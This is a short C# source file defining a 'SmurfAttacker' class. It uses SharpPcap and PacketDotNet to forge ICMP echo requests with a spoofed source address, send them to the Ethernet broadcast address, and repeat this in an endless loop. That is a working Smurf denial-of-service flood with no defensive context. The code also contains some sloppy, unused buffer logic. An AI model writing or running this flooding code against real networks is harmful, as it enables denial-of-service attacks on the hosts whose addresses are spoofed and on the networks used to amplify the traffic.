using PacketDotNet;
using SharpPcap;
using System.Net;
using System.Net.NetworkInformation;

namespace Ping
{
    public class SmurfAttacker
    {
        public void Start(IPAddress source, IPAddress destination, TimeSpan delay)
        {
            var devices = CaptureDeviceList.Instance;
            var device = devices[6];
            device.Open(DeviceModes.Promiscuous);

            var icmpPacket = new IcmpV4Packet(new PacketDotNet.Utils.ByteArraySegment(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x3c }, 0, 8));
            icmpPacket.TypeCode = IcmpV4TypeCode.EchoRequest;
            icmpPacket.UpdateIcmpChecksum();

            var ipPacket = new IPv4Packet(source, destination);
            ipPacket.PayloadPacket = icmpPacket;
            ipPacket.Protocol = ProtocolType.Icmp;
            ipPacket.TimeToLive = 128;
            ipPacket.UpdateIPChecksum();

            var combinedPayload = new byte[ipPacket.Bytes.Length + ipPacket.Bytes.Length];
            Buffer.BlockCopy(ipPacket.Bytes, 0, combinedPayload, 0, ipPacket.Bytes.Length);
            Buffer.BlockCopy(ipPacket.Bytes, 0, combinedPayload, ipPacket.Bytes.Length - 1, ipPacket.Bytes.Length);

            var ethernetPacket = new EthernetPacket(device.MacAddress, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetType.IPv4);
            ethernetPacket.PayloadPacket = ipPacket;

            while (true)
            {
                device.SendPacket(ethernetPacket);
                Thread.Sleep(delay);
            }
        }
    }
}
